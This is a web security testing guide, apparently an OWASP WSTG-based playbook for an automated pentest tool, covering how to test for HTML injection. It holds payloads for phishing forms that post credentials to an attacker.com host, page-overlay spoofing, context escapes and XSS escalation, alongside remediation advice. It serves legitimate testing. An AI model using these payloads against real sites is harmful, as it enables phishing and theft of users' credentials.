---
id: WSTG-CLNT-03
title: Testing for HTML Injection
category: Client-Side
severity_range: Low-Medium
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection
---

# WSTG-CLNT-03: Testing for HTML Injection

## Summary

HTML injection occurs when user-supplied input is embedded into a web page's HTML content without proper encoding or sanitization. Unlike XSS, which requires JavaScript execution, HTML injection allows attackers to modify page structure and content by injecting arbitrary HTML elements. This can be used for phishing (injecting fake login forms), content spoofing (modifying displayed information), social engineering, and in some cases escalation to full XSS.

## Test Objectives

- Identify input parameters reflected in HTML responses
- Test if HTML tags are rendered in the page
- Assess if injected HTML can be used for phishing or content spoofing
- Determine if HTML injection can be escalated to XSS

## Prerequisites

- Target application reflects user input in HTML responses
- Docker pentest container capturing traffic
- Input parameters and reflection points have been identified

## Test Steps

### Step 1: Identify Reflected Input Points

**CLI Actions:**
Use `curl` to submit a unique string and search for it in the response:

```
GET /search?q=UNIQUE_TEST_STRING_12345 HTTP/1.1
Host: target.com
```

```
GET /profile?name=UNIQUE_TEST_STRING_12345 HTTP/1.1
Host: target.com
```

Use `curl` with pattern `UNIQUE_TEST_STRING_12345` to find all reflection points across the application.

### Step 2: Test Basic HTML Tag Injection

**CLI Actions:**
Use `curl` to inject simple HTML tags and check if they render:

```
GET /search?q=<b>bold_test</b> HTTP/1.1
Host: target.com
```

```
GET /search?q=<h1>heading_test</h1> HTTP/1.1
Host: target.com
```

```
GET /search?q=<u>underline_test</u> HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode the HTML tags if needed:
```
GET /search?q=%3Cb%3Ebold_test%3C%2Fb%3E HTTP/1.1
Host: target.com
```

Check the response to see if HTML tags are rendered (not encoded as `&lt;b&gt;`).

### Step 3: Test Phishing via HTML Injection

**CLI Actions:**
Use `curl` to inject a fake login form:

```
GET /search?q=<h2>Session Expired</h2><form action="http://attacker.com/phish"><label>Username:</label><input name="user"><label>Password:</label><input name="pass" type="password"><input type="submit" value="Login"></form> HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode the entire payload for URL inclusion.

If HTML renders, users visiting the crafted URL would see a convincing phishing form on the legitimate domain.

### Step 4: Test Content Spoofing

**CLI Actions:**
Use `curl` to inject content that modifies page information:

```
GET /search?q=<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Account Suspended</h1><p>Contact support@attacker.com to reactivate.</p></div> HTTP/1.1
Host: target.com
```

Test if the injected content overlays the original page content.

### Step 5: Test HTML Injection in Different Contexts

**CLI Actions:**
Use `save to manual-review file` to test injection in various HTML contexts:

Inside an HTML attribute:
```
GET /page?class=test"><h1>Injected</h1><div class=" HTTP/1.1
Host: target.com
```

Inside a textarea:
```
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

message=</textarea><h1>Injected</h1><textarea>
```

Inside a title tag:
```
GET /page?title=</title><h1>Injected</h1><title> HTTP/1.1
Host: target.com
```

### Step 6: Test Escalation to XSS

**CLI Actions:**
If HTML injection is confirmed, test if it can be escalated to JavaScript execution:

```
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.com
```

```
GET /search?q=<svg onload=alert('XSS')> HTTP/1.1
Host: target.com
```

```
GET /search?q=<a href="javascript:alert('XSS')">Click</a> HTTP/1.1
Host: target.com
```

If event handlers and script tags are stripped but other HTML renders, the finding remains an HTML injection (not XSS).

Use `rynix_plugin_run('template-scan')` to check for HTML injection and XSS findings.

## Payloads

### Basic HTML Injection Tags
```
<b>bold</b>
<i>italic</i>
<u>underline</u>
<h1>heading</h1>
<br>
<hr>
<marquee>scrolling</marquee>
<img src="http://attacker.com/logo.png">
```

### Phishing Form Payloads
```
<form action="http://attacker.com/capture" method="POST">
<h3>Please re-enter your credentials</h3>
<input type="text" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" value="Login">
</form>
```

### Content Spoofing Payloads
```
<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;z-index:9999">
WARNING: Your account has been compromised. Call 1-800-ATTACKER.
</div>
```

### Context Escape Payloads
```
# Attribute context
"><h1>Injected</h1><input value="
# Textarea context
</textarea><h1>Injected</h1><textarea>
# Title context
</title><h1>Injected</h1><title>
# Comment context
--><h1>Injected</h1><!--
# Style context
</style><h1>Injected</h1><style>
```

### XSS Escalation Payloads
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
```

## Detection Criteria

A finding should be logged when:
- Injected HTML tags render in the page (not HTML-encoded in the response)
- Fake forms or content can be injected to create phishing scenarios
- Page content can be modified or overlaid with attacker-controlled content
- HTML injection can be escalated to XSS (JavaScript execution)
- Stored HTML injection persists across page loads

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| HTML injection escalates to XSS (JavaScript execution) | High (treat as XSS) |
| Stored HTML injection allowing persistent phishing forms | Medium |
| Reflected HTML injection allowing phishing via crafted URLs | Medium |
| Content spoofing that overlays the entire page | Medium |
| HTML injection limited to simple formatting tags (bold, italic) | Low |
| HTML injection in non-visible contexts (hidden fields, comments) | Low |
| All HTML input properly encoded as entities in output | Not a finding |

## Remediation

- HTML-encode all user-supplied data before embedding in HTML responses
- Use context-appropriate encoding (HTML entity encoding for HTML body, attribute encoding for attributes)
- Implement Content-Security-Policy to mitigate XSS escalation
- Use templating engines with auto-escaping enabled by default
- Validate input against expected formats where possible
- Use `X-Content-Type-Options: nosniff` to prevent MIME sniffing
- For rich text input, use a sanitization library (DOMPurify) with a strict allowlist of tags

## References

- [OWASP Testing Guide - HTML Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page](https://cwe.mitre.org/data/definitions/80.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

